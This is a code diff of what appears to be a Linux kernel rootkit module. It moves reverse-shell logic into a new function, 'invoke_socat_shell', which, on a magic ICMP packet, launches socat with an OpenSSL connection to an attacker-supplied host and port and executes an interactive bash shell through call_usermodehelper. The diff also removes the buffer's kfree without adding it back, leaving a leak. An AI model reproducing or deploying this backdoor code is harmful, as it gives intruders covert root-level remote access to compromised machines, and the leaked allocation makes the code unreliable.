@@ -5,6 +5,21 @@
 #include <linux/net.h>
 #include <linux/tcp.h>
 
+void invoke_socat_shell(char *argv[]) {
+  int shell_size = (strlen(argv[0]) + strlen(argv[1]) + 79);
+  char *shell_cmd = kmalloc(shell_size * sizeof(char), GFP_KERNEL);
+
+  snprintf(shell_cmd, shell_size,
+           "socat openssl-connect:%s:%s,verify=0 exec:'bash "
+           "-li',pty,stderr,setsid,sigint,sane",
+           argv[0], argv[1]);
+
+  char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
+                  NULL};
+  char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};
+  call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
+}
+
 unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
   const struct iphdr *ip_header;
   const struct icmphdr *icmp_header;
@@ -53,25 +68,11 @@ unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
         argv = argv_split(GFP_KERNEL, argv_str, NULL);
 
         if (argv) {
-          char *shell_cmd =
-              kmalloc((strlen(argv[0]) + strlen(argv[1]) + 79) * sizeof(char),
-                      GFP_KERNEL);
-          strcpy(shell_cmd, "socat openssl-connect:");
-          strcat(shell_cmd, argv[0]);
-          strcat(shell_cmd, ":");
-          strcat(shell_cmd, argv[1]);
-          strcat(shell_cmd,
-                 ",verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane");
-
-          char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/",
-                          "TERM=xterm", NULL};
-          char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};
-          call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
+          invoke_socat_shell(argv);
 #ifdef DEBUG
           printk(KERN_INFO "sended a shell\n");
 #endif
           argv_free(argv);
-          kfree(shell_cmd);
         }
         kfree(_data);
         kfree(argv_str);
